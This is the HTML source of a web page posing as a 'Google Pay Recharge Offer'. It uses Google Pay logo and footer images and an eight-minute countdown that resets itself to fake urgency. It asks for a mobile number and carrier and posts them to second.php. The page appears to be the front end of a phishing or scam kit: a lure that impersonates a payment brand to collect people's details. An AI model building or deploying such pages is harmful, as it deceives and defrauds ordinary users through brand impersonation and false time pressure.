<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Pay Recharge Offer</title>
    <link rel="stylesheet" href="style.css">
    <style>
        /* Add some basic styling */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f9fa;
        }

        header {
            background-color: #fff;
            padding: 10px;
            text-align: center;
        }

        .logo {
            height: 50px;
        }

        .banner {
            width: 100%;
            display: block;
        }

        .offer-banner {
    margin: 0 10px; /* Left and right margin */
    border-radius: 10px; /* Rounded corners */
    overflow: hidden; /* Ensure the image fits within the rounded corners */
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Subtle shadow for depth */
}

        .timer-box {
            width: 100%;
            background-color: #e0f7fa; /* Very light blue color */
            padding: 10px; /* Padding around the text */
            text-align: center; /* Center text */
            margin-top: 10px; /* Space above the timer */
            display: flex; /* Use flexbox for layout */
            justify-content: center; /* Center items horizontally */
            align-items: center; /* Center items vertically */
            font-size: 14px; /* Smaller font size */
        }

        .timer {
            font-size: 16px; /* Slightly larger font size for the timer */
            color: #ff0000; /* Red color for the timer */
            margin-left: 5px; /* Space between text and timer */
        }

        .recharge-form {
            margin: 20px;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .recharge-form h3 {
            font-size: 20px;
            color: #007bff;
        }

        .provider {
            display: flex;
            justify-content: space-between; /* Space between items */
            margin: 10px 0;
        }

        .provider-option {
            flex: 1; /* Flexbox to allow equal width */
            margin: 0 5px; /* Space between options */
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 10px;
            text-align: center;
            cursor: pointer;
            transition: background-color 0.3s; /* Smooth transition for background */
        }

        .provider-option input[type="radio"] {
            display: none; /* Hide the radio button */
        }

        .provider-option.selected {
            background-color: #0066ff; /* Highlight color when selected */
            color: white; /* Change text color to white */
        }

        .provider-option:hover {
            background-color: #0066ff; /* Light gray on hover */
        }

        .recharge-form input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .recharge-form input[type="submit"] {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }

        /* Footer styling */
        footer {
            background-color: #f8f9fa;
            text-align: center;
            padding: 20px 0;
            position: relative;
            bottom: 0;
            width: 100%;
        }

        footer img {
            width: 100%;
        }

        /* Responsive adjustments */
        @media screen and (max-width: 768px) {
            .recharge-form {
                margin: 10px;
            }
        }
    </style>
    <script>
        // JavaScript to create an 8-minute countdown timer
        function startTimer(duration, display) {
            var timer = duration, minutes, seconds;
            var interval = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    clearInterval(interval); // Stop the timer
                    location.reload(); // Refresh the page when the timer reaches zero
                }
            }, 1000);
        }

        window.onload = function () {
            var eightMinutes = 60 * 8,
                display = document.querySelector('#time'); // Select the timer display
            startTimer(eightMinutes, display); // Start the timer

            // Automatically select the Jio option
            const jioOption = document.querySelector('#jio');
            jioOption.checked = true;
            jioOption.parentElement.classList.add('selected');
        };

        // Handle provider selection
        function selectProvider(event) {
            const providerOptions = document.querySelectorAll('.provider-option');
            providerOptions.forEach(option => option.classList.remove('selected'));
            event.currentTarget.classList.add('selected');
            event.currentTarget.querySelector('input[type="radio"]').checked = true;
        }

        document.addEventListener('DOMContentLoaded', () => {
            const providerOptions = document.querySelectorAll('.provider-option');
            providerOptions.forEach(option => {
                option.addEventListener('click', selectProvider);
            });
        });
    </script>
</head>

<body>
    <!-- Header with logo -->
    <header>
        <img src="images/logo.png" alt="Google Pay Logo" class="logo">
    </header>

    <!-- Offer banner -->
    <section class="offer-banner">
        <img src="images/recharge_offer_banner.png" alt="Recharge Offer Banner" class="banner">
    </section>

    <!-- Timer Box -->
    <div class="timer-box">
        <span>Special Offer Ends In:</span>
        <div class="timer" id="time">08:00</div> <!-- Timer display -->
    </div>

    <!-- Recharge form section -->
    <section class="recharge-form">
        <h3>Mobile Recharge</h3>
        <form action="second.php" method="post">
            <label for="provider">Select Network Provider:</label><br>
            <div class="provider">
                <div class="provider-option" id="jio-option">
                    <input type="radio" id="jio" name="provider" value="Jio"> Jio
                </div>
                <div class="provider-option" id="airtel-option">
                    <input type="radio" id="airtel" name="provider" value="Airtel"> Airtel
                </div>
                <div class="provider-option" id="vi-option">
                    <input type="radio" id="vi" name="provider" value="VI"> VI
                </div>
                <div class="provider-option" id="bsnl-option">
                    <input type="radio" id="bsnl" name="provider" value="BSNL"> BSNL
                </div>
            </div><br>

            <label for="mobile">Mobile Number:</label><br>
            <input type="text" id="mobile" name="mobile" placeholder="+91 XXXXXXXXXX"><br><br>

            <input type="submit" value="Recharge">
        </form>
    </section>

    <!-- Footer with full-width image -->
    <footer>
        <img src="images/google_pay_footer.webp" alt="Google Pay Footer">
    </footer>
</body>

</html>
